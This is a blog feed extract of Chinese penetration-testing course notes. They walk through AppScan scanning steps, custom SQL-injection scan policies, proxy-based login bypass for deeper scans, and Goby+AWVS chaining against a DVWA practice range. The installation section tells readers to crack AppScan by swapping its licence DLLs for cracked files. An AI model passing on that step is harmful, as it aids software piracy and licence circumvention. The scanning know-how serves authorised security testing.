alt="image.png"></p><p>3.最低严重性选择为【中】，测试类型选择为【应用程序】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1640841025000/9c78640cace24a498a841f9cb43410bd.png" alt="image.png"></p><p>4.点击【布局】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1640841025000/e41b7307149b430eb2606f0cee651a84.png" alt="image.png"></p><p>5.选择【其他徽标】，点击上传徽标</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1640841025000/df41332deeca4243bd9a9f2b098c50e3.png" alt="image.png"></p><p>6.选择徽标，点击打开</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1640841025000/58c0f0878dd4457bbf97c1ca6fbfae45.png" alt="image.png"></p><p>7.修改报告标题，比如输入 【哔哩嘀哩网站安全评估报告】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1640841025000/c9709b41eff441cab81b66b982fa958a.png" alt="image.png"></p><p>8.点击【保存报告】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1640841025000/4a4c6ce4f8b44483be607691b1ca8dc1.png" alt="image.png"></p><p>9.选择喜欢的位置保存</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1640841025000/59d25ea09c1b46169c0a3a6258711bbd.png" alt="image.png"></p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1640841025000/2de43fdea3194cd5ac62997e1dc5edaf.png" alt="image.png"></p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1640841025000/f0c77212eb8e4e828585f795344b6ab9.png" alt="image.png"></p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1640841025000/fa4e3bd17c6743f994862de41f0e87eb.png" alt="image.png"></p><h2 id="3-其他报告"><a href="#3-其他报告" class="headerlink" title="3.其他报告"></a>3.其他报告</h2><p>1.行业标准报告</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1640841025000/5c7340c0a26f498cbcf4a9feb30a8b65.png" alt="image.png"></p><p>2.合规一致性报告</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1640841025000/4812c10f2bd445d6ac3d63e3caae12f8.png" alt="image.png"></p><p>3.基于模板报告</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1640841025000/d7bbb31bea304c5086c93f66a8e4bbda.png" alt="image.png"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/23appscan-lou-dong-sao-miao/di-5-jie-zi-ding-yi-sao-miao-ce-lue-sao-miao-zhen-dui-xing-lou-dong/"/>
      <url>/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/23appscan-lou-dong-sao-miao/di-5-jie-zi-ding-yi-sao-miao-ce-lue-sao-miao-zhen-dui-xing-lou-dong/</url>
      
        <content type="html"><![CDATA[<h1 id="第五节-AppScan自定义扫描策略，扫描针对性漏洞"><a href="#第五节-AppScan自定义扫描策略，扫描针对性漏洞" class="headerlink" title="第五节-AppScan自定义扫描策略，扫描针对性漏洞"></a>第五节-AppScan自定义扫描策略，扫描针对性漏洞</h1><p>安全扫描往往速度是很慢的，有些场景下他的扫描项目又不是我们需要的，这时候就需要定制专属的扫描策略了。本节课以sql注入漏洞为例</p><p>1.选择【扫描web应用程序】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1640667392000/2e5a3c50f05f46879fac8a82573bd283.png" alt="image.png"></p><p>2.点击【取消】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1640667392000/c18d316f818b4febb9be9624370583c3.png" alt="image.png"></p><p>3.点击【配置】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1640667392000/8b3ac7c8fb804ecabcd04b20606236f1.png" alt="image.png"></p><p>4.输入被目标网站url</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1640667392000/6acf7962b56b40cdae8e59cbdfd2b83d.png" alt="image.png"></p><p>5.选择【参数和cookie】，选择【定制头】，点击【+】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1640667392000/0025b2e972fb46f594c42f356e17cadb.png" alt="image.png"></p><p>4.切换火狐浏览器，复制网站cookie</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1640667392000/ed966b809eb140b4842fd846b623c2cb.png" alt="image.png"></p><p>5.切换到AppScan，填写定制头，点击【确定】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1640667392000/6b9c37b2f38744c499373f48b7c7466e.png" alt="image.png"></p><p>6.点击【测试策略】，选择【缺省值】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1640667392000/cda5ef11493848ee9431d497e693fff5.png" alt="image.png"></p><p>7.将所有的选中状态去掉</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1640667392000/832603718ecc4424a80ee7907253d79f.png" alt="image.png"></p><p>8.搜索sql注入</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1640667392000/71eed16ff0ce4cd69ad97e6815d5e36b.png" alt="image.png"></p><p>9.展开全选该漏洞的pload</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1640667392000/c6ffc56796ae4b5f8c78e70633b7b55b.png" alt="image.png"></p><p>10.点击【应用】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1640667392000/c17d8474fb044dcfa9fc2f32e5bf5ceb.png" alt="image.png"></p><p>11.点击【导出】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1640667392000/e2071bd37d6641aa92c003bfb570f143.png" alt="image.png"></p><p>12.选择喜欢的位置保存</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1640667392000/b75c613fc42b48f6a80ba270be667ae2.png" alt="image.png"></p><p>13.点击【导入】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1640667392000/a75ab821e297455989669f00ae32795f.png" alt="image.png"></p><p>14.选则需要的自定义策略</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1640667392000/6026d155a3164ec396ca75796f63432c.png" alt="image.png"></p><p>15.点击【确定】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1640667392000/fa0211647f8c4fe3be38710e2de6b8be.png" alt="image.png"></p><p>16.点击【手动扫描】，选择【AppScan Chromium 浏览器】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1640667392000/f2167c67d48b4feb989384b52ab805fb.png" alt="image.png"></p><p>17.选则要探索的页面，然后点击【确定】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1640667392000/24f2de24301b4d92a9d3cbeebfb9bd97.png" alt="image.png"></p><p>18.点击【确定】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1640667392000/1609886d3eae47f29af655201b45d55a.png" alt="image.png"></p><p>19.等待加载完成</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1640667392000/9cf3cea101ae41c4b2e9262d58988b1e.png" alt="image.png"></p><p>20.点击【扫描】，选择【仅测试】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1640667392000/8b9305d524584c41b7257845bc43e999.png" alt="image.png"></p><p>21.等待测试结果</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1640667392000/cc5a78f3e4a34902a888da3f4785e63c.png" alt="image.png"></p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1640667392000/eb7431b64b194406a0548243f877c9f9.png" alt="image.png"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/23appscan-lou-dong-sao-miao/di-4-jie-rao-guo-deng-lu-yan-zheng-ma-shen-ru-sao-miao/"/>
      <url>/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/23appscan-lou-dong-sao-miao/di-4-jie-rao-guo-deng-lu-yan-zheng-ma-shen-ru-sao-miao/</url>
      
        <content type="html"><![CDATA[<h1 id="第四节-绕过登录验证码深入扫描"><a href="#第四节-绕过登录验证码深入扫描" class="headerlink" title="第四节-绕过登录验证码深入扫描"></a>第四节-绕过登录验证码深入扫描</h1><p>我们工作中最长碰到的工作场景是网站采用https协议，这时我们要用appScan进行扫描时，就需要先安装证书</p><h2 id="1-证书安装"><a href="#1-证书安装" class="headerlink" title="1.证书安装"></a>1.证书安装</h2><p>1.新建一个文件，点击【文件】，点击【新建】</p><p><img src="images/c2cfd88d4b714cdab43af4c8e7cdb06d.png" alt="image.png"></p><p>2.选择【扫描web应用程序】</p><p><img src="images/c2c466aa8c474c8285cfedea2cd4e819.png" alt="image.png"></p><p>3.点击【取消】</p><p><img src="images/4bdc797b5c1a4b0db90df2164600a0ce.png" alt="image.png"></p><p>4.点击【手动扫描】，选择【外部设备】</p><p><img src="images/cab4a5ef42054822941f0831e9498498.png" alt="image.png"></p><p>5.记录代理端口</p><p><img src="images/3d64ba27c5084853a0a3dbdfff736651.png" alt="image.png"></p><p>6.点击【记录代理配置】</p><p><img src="images/704f20425aa2482fa6bfdacf166f7c19.png" alt="image.png"></p><p>7.点击【记录代理】,点击【导出】</p><p><img src="images/646d91731ece4fce965495fb0af02830.png" alt="image.png"></p><p>8.选择喜欢的位置，点击【保存】</p><p><img src="images/19cc1e3e724a4d01b63b8a62fa8b6437.png" alt="image.png"></p><p>9.点击【取消】</p><p><img src="images/4429279212ee445bada658d51e2081ae.png" alt="image.png"></p><p>10.解压已经保存的证书</p><p><img src="images/fb6f8a02302f49c7979a7d3911228e9b.png" alt="image.png"></p><p>11.切换到火狐浏览器，点击【更多】，点击【设置】</p><p><img src="images/183fa51ed27a4fb9a29bf53145876b97.png" alt="image.png"></p><p>12.输入证书，点击【回车】，点击【查看证书】</p><p><img src="images/72039d699ea14ed59b691f2f3bdbb9eb.png" alt="image.png"></p><p>13.点击【证书颁发机构】，点击【导入】</p><p><img src="images/640bf9059f674c2eae885b39eca32392.png" alt="image.png"></p><p>14.选择证书，点击【打开】</p><p><img src="images/0eb3191f0ec845bc86bbc171ecc0f45c.png" alt="image.png"></p><p>15.勾选信任证书，点击【确定】</p><p><img src="images/ff7fb370aec84bf7bb00d407e92ae443.png" alt="image.png"></p><p>16.点击【确定】</p><p><img src="images/d782b58bd4e14794aad272ebf192947a.png" alt="image.png"></p><h2 id="2-手工探测绕过登录"><a href="#2-手工探测绕过登录" class="headerlink" title="2.手工探测绕过登录"></a>2.手工探测绕过登录</h2><p>扫描过程会遇到网站 存在 手机验证码，图形验证码，滑动验证等等，这时候想要深度扫描时，就需要进行登录绕过。有两种方法可以选择</p><p>第一：使用第三节课介绍的定制头解决</p><p>第二：使用手工探索-外置设备进行登录绕过，我们今天讲解第二种</p><p>1.新建一个文件，点击【文件】，点击【新建】</p><p><img src="images/c2cfd88d4b714cdab43af4c8e7cdb06d.png" alt="image.png"></p><p>2.选择【扫描web应用程序】</p><p><img src="images/c2c466aa8c474c8285cfedea2cd4e819.png" alt="image.png"></p><p>3.输入被测网址，点击【下一步】</p><p><img src="images/df15f4f11ddc4368a9f2225e6e52b131.png" alt="image.png"></p><p>4.点击【记录】,点击【AppScan Chromium 浏览器】</p><p><img src="images/655fdfe74d934406ada64b9800aafe91.png" alt="image.png"></p><p>5.进行登录</p><p><img src="images/ebf536ebb6e44530b40a28df07d0784f.png" alt="image.png"></p><p>6.点击【我已登录到站点】</p><p><img src="images/128a98bf975040cba4ffb2204623e16a.png" alt="image.png"></p><p><img src="images/3a5c95f334bc40df86c1db022798bfba.png" alt="image.png"></p><p><img src="images/dceb8d324cc04ac1bed635a6f4d34d62.png" alt="image.png"></p><p>可以看到，登录回放是失败，遇到这种情况，我们今天使用手工探索-外置设备进行登录绕过</p><p>7.点击【关闭】</p><p><img src="images/873586ce76cd43cb925bc6cc216f9569.png" alt="image.png"></p><p>8.点击【取消】</p><p><img src="images/14cc3447348f44ed89a023bf07863d5c.png" alt="image.png"></p><p>9.点击【取消】</p><p><img src="images/9ea29ca3ecbb4f3387d2efd2187b002b.png" alt="image.png"></p><p>10.点击【手动扫描】，选择【外部设备】</p><p><img src="images/cab4a5ef42054822941f0831e9498498.png" alt="image.png"></p><p>11.记录代理端口</p><p><img src="images/02cc9d867b9d4ae4b4cceb505a271d18.png" alt="image.png"></p><p>12.切到火狐浏览器，进入被测网站，登录</p><p><img src="images/c26acb3fb5c4422b86274cf8d2c256e9.png" alt="image.png"></p><p>13.点击【代理】，点击【选项】</p><p><img src="images/a6a9e71178ae40a29a238b632a87cfc0.png" alt="image.png"></p><p>14.点击【编辑】</p><p><img src="images/9a8cf830b95a4d93899a0a64672f691c.png" alt="image.png"></p><p>15.输入AppScan的端口,点击【保存】</p><p><img src="images/883d17b276b24cec95950f80d64e7642.png" alt="image.png"></p><p>16.切换到被测网站，点击【代理】，选择【appscan】</p><p><img src="images/c89091852abb4fc5b6f7a6f06fa594ef.png" alt="image.png"></p><p>17.点击想要测试功能</p><p><img src="images/63d15e0c22fc40b99974ef30daa4f687.png" alt="image.png"></p><p><img src="images/2723ab0161b7436aa7cb9f8c903789a0.png" alt="image.png"></p><p>18.点击【停止记录】</p><p><img src="images/3b26cf2705b04f98bfc8e3abedd75003.png" alt="image.png"></p><p>19.选择被测网站，点击【确定】</p><p><img src="images/d8a705be72e0435e963f93efe07c4fa7.png" alt="image.png"></p><p>20.等待流量加载完成</p><p><img src="images/030b485295774299b3b5c71da4e1d48b.png" alt="image.png"></p><p>21.点击【扫描】，点击【仅测试】</p><p><img src="images/ad65b72debe443fdb80dcbe019654dcf.png" alt="image.png"></p><p>22.等待测试结果</p><p><img src="images/e9c9f52f51bb4138b66f3a0524f14311.png" alt="image.png"></p><p><img src="images/8330ddbad423477a8f66206c6c07bf1c.png" alt="image.png"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/23appscan-lou-dong-sao-miao/di-3-jie-appscan-bei-dong-shou-dong-tan-suo-sao-miao/"/>
      <url>/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/23appscan-lou-dong-sao-miao/di-3-jie-appscan-bei-dong-shou-dong-tan-suo-sao-miao/</url>
      
        <content type="html"><![CDATA[<h1 id="第三节-AppScan被动手动探索扫描"><a href="#第三节-AppScan被动手动探索扫描" class="headerlink" title="第三节-AppScan被动手动探索扫描"></a>第三节-AppScan被动手动探索扫描</h1><p>被动式扫描：浏览器代理到AppScan，然后进行手工操作，探索产生出的流量给AppScan进行扫描。</p><p>他的优点是：扫描足够精准，覆盖率更加高，减少不必要的干扰包等等</p><h2 id="1-扫描基础准备"><a href="#1-扫描基础准备" class="headerlink" title="1.扫描基础准备"></a>1.扫描基础准备</h2><h3 id="1-火狐安装FoxyProxy"><a href="#1-火狐安装FoxyProxy" class="headerlink" title="1.火狐安装FoxyProxy"></a>1.火狐安装FoxyProxy</h3><p>1.打开扩展和主题</p><pre class="line-numbers language-none"><code class="language-none">about:addons<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>2.输入FoxyProxy 点击【回车】搜索</p><p><img src="images/image-20211220101102542.png" alt="image-20211220101102542"></p><p>3.点击 【FoxyProxy Standard】</p><p><img src="images/image-20211220101117058.png" alt="image-20211220101117058"></p><p>4.点击【添加到 Firefox】</p><p><img src="images/image-20211220101133106.png" alt="image-20211220101133106"></p><h3 id="2-马士兵靶场"><a href="#2-马士兵靶场" class="headerlink" title="2.马士兵靶场"></a>2.马士兵靶场</h3><p>1.进入靶场</p><pre class="line-numbers language-none"><code class="language-none">https://www.bafangwy.com/battle<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>2.启动dvwa靶场</p><p><img src="images/image-20211220101210330.png" alt="image-20211220101210330"></p><p><img src="images/image-20211220101218208.png" alt="image-20211220101218208"></p><p>3.访问靶场</p><pre class="line-numbers language-none"><code class="language-none">http://39.101.162.123:64936/login.phpadminpassword<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>4.设置安全等级为low</p><p><img src="images/image-20211220101245688.png" alt="image-20211220101245688"></p><p><img src="images/image-20211220101251950.png" alt="image-20211220101251950"></p><h2 id="2-扫描步骤"><a href="#2-扫描步骤" class="headerlink" title="2.扫描步骤"></a>2.扫描步骤</h2><h3 id="1选择【扫描】–【手动探索】–【外部设备】"><a href="#1选择【扫描】–【手动探索】–【外部设备】" class="headerlink" title="1选择【扫描】–【手动探索】–【外部设备】"></a>1选择【扫描】–【手动探索】–【外部设备】</h3><p><img src="images/image-20211220101317215.png" alt="image-20211220101317215"></p><p><img src="images/image-20211220101326318.png" alt="image-20211220101326318"></p><h3 id="2-火狐浏览器点击【代理】–选择【选项】"><a href="#2-火狐浏览器点击【代理】–选择【选项】" class="headerlink" title="2.火狐浏览器点击【代理】–选择【选项】"></a>2.火狐浏览器点击【代理】–选择【选项】</h3><p><img src="images/image-20211220101344037.png" alt="image-20211220101344037"></p><h3 id="3-点击【添加】"><a href="#3-点击【添加】" class="headerlink" title="3.点击【添加】"></a>3.点击【添加】</h3><p><img src="images/image-20211220101355972.png" alt="image-20211220101355972"></p><h3 id="4-输入标题【appsacn】，添加ip【127-0-0-1】，添加端口【49729】，点击保存"><a href="#4-输入标题【appsacn】，添加ip【127-0-0-1】，添加端口【49729】，点击保存" class="headerlink" title="4.输入标题【appsacn】，添加ip【127.0.0.1】，添加端口【49729】，点击保存"></a>4.输入标题【appsacn】，添加ip【127.0.0.1】，添加端口【49729】，点击保存</h3><p><img src="images/image-20211220101409923.png" alt="image-20211220101409923"></p><p><img src="images/image-20211220101417072.png" alt="image-20211220101417072"></p><h3 id="5-开启代理"><a href="#5-开启代理" class="headerlink" title="5.开启代理"></a>5.开启代理</h3><p><img src="images/image-20211220101432626.png" alt="image-20211220101432626"></p><h3 id="6-操作被测网站"><a href="#6-操作被测网站" class="headerlink" title="6.操作被测网站"></a>6.操作被测网站</h3><p><img src="images/image-20211220101444737.png" alt="image-20211220101444737"></p><h3 id="7-切换到appScan-点击【停止记录】"><a href="#7-切换到appScan-点击【停止记录】" class="headerlink" title="7.切换到appScan 点击【停止记录】"></a>7.切换到appScan 点击【停止记录】</h3><p><img src="images/image-20211220101456598.png" alt="image-20211220101456598"></p><h3 id="8-选择网站，点击【确定】"><a href="#8-选择网站，点击【确定】" class="headerlink" title="8.选择网站，点击【确定】"></a>8.选择网站，点击【确定】</h3><p><img src="images/image-20211220101508810.png" alt="image-20211220101508810"></p><p><img src="images/image-20211220101515856.png" alt="image-20211220101515856"></p><h3 id="9-点击【扫描】，选择【仅测试】"><a href="#9-点击【扫描】，选择【仅测试】" class="headerlink" title="9.点击【扫描】，选择【仅测试】"></a>9.点击【扫描】，选择【仅测试】</h3><p><img src="images/image-20211220101534029.png" alt="image-20211220101534029"></p><h3 id="10-点击【是】"><a href="#10-点击【是】" class="headerlink" title="10.点击【是】"></a>10.点击【是】</h3><p><img src="images/image-20211220101544955.png" alt="image-20211220101544955"></p><h3 id="11-选则储存位置，点击保存"><a href="#11-选则储存位置，点击保存" class="headerlink" title="11.选则储存位置，点击保存"></a>11.选则储存位置，点击保存</h3><p><img src="images/image-20211220101556686.png" alt="image-20211220101556686"></p><h3 id="12-等待测试结果"><a href="#12-等待测试结果" class="headerlink" title="12.等待测试结果"></a>12.等待测试结果</h3><p><img src="images/image-20211220101609909.png" alt="image-20211220101609909"></p><p><img src="images/image-20211220101617427.png" alt="image-20211220101617427"></p><h2 id="3-appscan内置浏览器扫描"><a href="#3-appscan内置浏览器扫描" class="headerlink" title="3.appscan内置浏览器扫描"></a>3.appscan内置浏览器扫描</h2><h3 id="1-点击【手动探索】，选则【AppScan-Chromium-浏览器】"><a href="#1-点击【手动探索】，选则【AppScan-Chromium-浏览器】" class="headerlink" title="1.点击【手动探索】，选则【AppScan Chromium 浏览器】"></a>1.点击【手动探索】，选则【AppScan Chromium 浏览器】</h3><p><img src="images/image-20211220101630427.png" alt="image-20211220101630427"></p><h3 id="2-点击【是】"><a href="#2-点击【是】" class="headerlink" title="2.点击【是】"></a>2.点击【是】</h3><p><img src="images/image-20211220101650772.png" alt="image-20211220101650772"></p><h3 id="3-输入URL-点击【确定】"><a href="#3-输入URL-点击【确定】" class="headerlink" title="3.输入URL 点击【确定】"></a>3.输入URL 点击【确定】</h3><p><img src="images/image-20211220101703074.png" alt="image-20211220101703074"></p><h3 id="4-点击取消"><a href="#4-点击取消" class="headerlink" title="4.点击取消"></a>4.点击取消</h3><p><img src="images/image-20211220101715529.png" alt="image-20211220101715529"></p><h3 id="5-点击【配置】–【参数和cookie】–【定制头】"><a href="#5-点击【配置】–【参数和cookie】–【定制头】" class="headerlink" title="5.点击【配置】–【参数和cookie】–【定制头】"></a>5.点击【配置】–【参数和cookie】–【定制头】</h3><p><img src="images/image-20211220101727775.png" alt="image-20211220101727775"></p><h3 id="6-在火狐浏览器复制cookie"><a href="#6-在火狐浏览器复制cookie" class="headerlink" title="6.在火狐浏览器复制cookie"></a>6.在火狐浏览器复制cookie</h3><p><img src="images/image-20211220101740026.png" alt="image-20211220101740026"></p><h3 id="7-切换到AppScan，点击【-】，添加cookie，点击【确定】"><a href="#7-切换到AppScan，点击【-】，添加cookie，点击【确定】" class="headerlink" title="7.切换到AppScan，点击【+】，添加cookie，点击【确定】"></a>7.切换到AppScan，点击【+】，添加cookie，点击【确定】</h3><p><img src="images/image-20211220101752959.png" alt="image-20211220101752959"></p><h3 id="8-点击确定"><a href="#8-点击确定" class="headerlink" title="8.点击确定"></a>8.点击确定</h3><p><img src="images/image-20211220101803601.png" alt="image-20211220101803601"></p><h3 id="9-点击【手动探索】，选则【AppScan-Chromium-浏览器】"><a href="#9-点击【手动探索】，选则【AppScan-Chromium-浏览器】" class="headerlink" title="9.点击【手动探索】，选则【AppScan Chromium 浏览器】"></a>9.点击【手动探索】，选则【AppScan Chromium 浏览器】</h3><p><img src="images/image-20211220101815512.png" alt="image-20211220101815512"></p><h3 id="10-进行手工探索，完成后，点击【确定】"><a href="#10-进行手工探索，完成后，点击【确定】" class="headerlink" title="10.进行手工探索，完成后，点击【确定】"></a>10.进行手工探索，完成后，点击【确定】</h3><p><img src="images/image-20211220101829329.png" alt="image-20211220101829329"></p><p><img src="images/image-20211220101836928.png" alt="image-20211220101836928"></p><h3 id="11-点击【确定】"><a href="#11-点击【确定】" class="headerlink" title="11.点击【确定】"></a>11.点击【确定】</h3><p><img src="images/image-20211220101848039.png" alt="image-20211220101848039"></p><p><img src="images/image-20211220101854695.png" alt="image-20211220101854695"></p><h3 id="12-点击【扫描】–【仅测试】"><a href="#12-点击【扫描】–【仅测试】" class="headerlink" title="12.点击【扫描】–【仅测试】"></a>12.点击【扫描】–【仅测试】</h3><p><img src="images/image-20211220101906463.png" alt="image-20211220101906463"></p><p>13.点击【是】</p><p><img src="images/image-20211220101916451.png" alt="image-20211220101916451"></p><h3 id="14-选择保存位置，点击【保存】"><a href="#14-选择保存位置，点击【保存】" class="headerlink" title="14.选择保存位置，点击【保存】"></a>14.选择保存位置，点击【保存】</h3><p><img src="images/image-20211220101929768.png" alt="image-20211220101929768"></p><h3 id="15-等待扫描结果"><a href="#15-等待扫描结果" class="headerlink" title="15.等待扫描结果"></a>15.等待扫描结果</h3><p><img src="images/image-20211220101941766.png" alt="image-20211220101941766"></p><p><img src="images/image-20211220101948472.png" alt="image-20211220101948472"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/23appscan-lou-dong-sao-miao/di-1-jie-appscan-jie-shao-he-an-zhuang/"/>
      <url>/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/23appscan-lou-dong-sao-miao/di-1-jie-appscan-jie-shao-he-an-zhuang/</url>
      
        <content type="html"><![CDATA[<h1 id="第一节-AppScan介绍和安装"><a href="#第一节-AppScan介绍和安装" class="headerlink" title="第一节-AppScan介绍和安装"></a>第一节-AppScan介绍和安装</h1><h2 id="1-简介"><a href="#1-简介" class="headerlink" title="1.简介"></a>1.简介</h2><p>Appscan 10中文版是是全新网络安全漏洞扫描软件，软件可以直接可以对OS命令、SSRF和XXE攻击等漏洞进行检测，使得漏洞检测更加容易，提高漏洞的扫描效率。软件同时支持动态、静态、互动分析三种不同的测试功能，可自动化扫描检测网络或者系统安全漏洞，并采用全新的爬虫技术，能够根据网站入口自动摸取网页链接进行安全扫描，提供了扫描、报告和修复建议等功能。</p><h2 id="2-功能特色"><a href="#2-功能特色" class="headerlink" title="2.功能特色"></a>2.功能特色</h2><p>　　1、动态分析（“黑盒扫描”）</p><p>　　这是主要方法，用于测试和评估运行时的应用程序响应。</p><p>　　2、静态分析（“白盒扫描”）【代码审计】</p><p>　　这是用于在完整 Web 页面上下文中分析 JavaScript 代码的独特技术。</p><p>　　3、交互分析（“glass box 扫描”）</p><p>　　动态测试引擎可与驻留在 Web 服务器本身上的专用 glass-box 代理程序交互，从而使软件能够比仅通过传统动态测试时识别更多问题并具有更高准确性。</p><p>　　4、软件的高级功能包括：</p><p>　　常规和法规一致性报告，并提供超过 40 个不同的开箱即用模板。</p><h2 id="3-扫描流程"><a href="#3-扫描流程" class="headerlink" title="3.扫描流程"></a>3.扫描流程</h2><p><img src="images/image-20211201203930801.png" alt="image-20211201203930801"></p><p><img src="images/image-20211201203950394.png" alt="image-20211201203950394"></p><h2 id="4-扫描方式"><a href="#4-扫描方式" class="headerlink" title="4.扫描方式"></a>4.扫描方式</h2><p>Static： 静态分析 （白盒扫描）   源码分析：支持（Taint analysis\pattern matching）</p><p>Dynamic： 动态分析 （黑盒扫描）</p><p>Hybrid：混合分析（黑，白）【知道源代码】</p><p>Run-Time： 运行时分析（玻璃盒）【不知道源代码】</p><p>Client-Side：客户端分析(Javascript)</p><h2 id="5-安装与破解"><a href="#5-安装与破解" class="headerlink" title="5.安装与破解"></a>5.安装与破解</h2><p>1.安装前需安装.NET Framework 4.7.2（已安装请忽略）</p><p>2.双击运行Appscan_Setup_1002.exe，选择安装语言，点击确定；</p><p><img src="images/image-20211201204315728.png" alt="image-20211201204315728"></p><p>3.选择I accept，点击下一步；</p><p><img src="images/image-20211201204336720.png" alt="image-20211201204336720"></p><p>4.更改安装目录，点击安装；（注意记录下这个目录后面破解需要用到）</p><p><img src="images/image-20211201204403352.png" alt="image-20211201204403352"></p><p>5.等待安装直到完成；</p><p><img src="images/image-20211201204422500.png" alt="image-20211201204422500"></p><p>6.将破解文件 AppScanSDK.dll 和 HclLicenseProvider.dll 拷贝到安装目录D:\Program Files (x86)\HCL\AppScan Standard下替换原来的文件</p><p><img src="images/image-20211201204444993.png" alt="image-20211201204444993"></p><p><img src="images/image-20211201204453175.png" alt="image-20211201204453175"></p><p>7.双击桌面图标运行AppScan；</p><p><img src="images/image-20211201204517852.png" alt="image-20211201204517852"></p><p>8.安装成功</p><p><img src="images/image-20211201204548270.png" alt="image-20211201204548270"></p><p><img src="images/image-20211201204557166.png" alt="image-20211201204557166"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/22awvs-lou-dong-sao-miao/di-5-jie-goby-awvs-lian-dong/"/>
      <url>/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/22awvs-lou-dong-sao-miao/di-5-jie-goby-awvs-lian-dong/</url>
      
        <content type="html"><![CDATA[<h1 id="第五节-Goby-AWVS-联动"><a href="#第五节-Goby-AWVS-联动" class="headerlink" title="第五节-Goby+AWVS 联动"></a>第五节-Goby+AWVS 联动</h1><h2 id="1-Goby简介"><a href="#1-Goby简介" class="headerlink" title="1.Goby简介"></a>1.Goby简介</h2><p>Goby是针对目标企业梳理最全面的工具，同构goby可以清晰的扫描出ip地址开放的端口，以及端口对应的服务，于此同事会根据开放的端口及应用进行实战化的测试，并不在乎他的中低危害漏洞，而更在乎的是它能直接getshell的漏洞。</p><p>AWVS这款工具大家应该都比较熟悉了，他是针对web的轻量级的漏洞扫描工具。也就是根据我们提供的被扫描地址，快速的扫描出其所有的漏洞，包含高中低及信息泄露等漏洞。</p><p>结合我们前面的介绍，大家想想，Goby探测出ip地址开放的所有服务及应用，然后直接丢给AWVS，那么AWVS是不是就可以直接进行扫描了，然后存在的网站存在的漏扫是不是一幕了然了，还需要我们去手动挖么，很显然了啊，这俩工具一联动，躺着收洞洞呗。</p><p>Goby 错误异常汇总</p><p><a href="https://cn.gobies.org/faq.html">https://cn.gobies.org/faq.html</a></p><h2 id="2-Goby安装"><a href="#2-Goby安装" class="headerlink" title="2.Goby安装"></a>2.Goby安装</h2><p>1.在附件中下载 goby-win-x64-1.9.320.zip</p><p><img 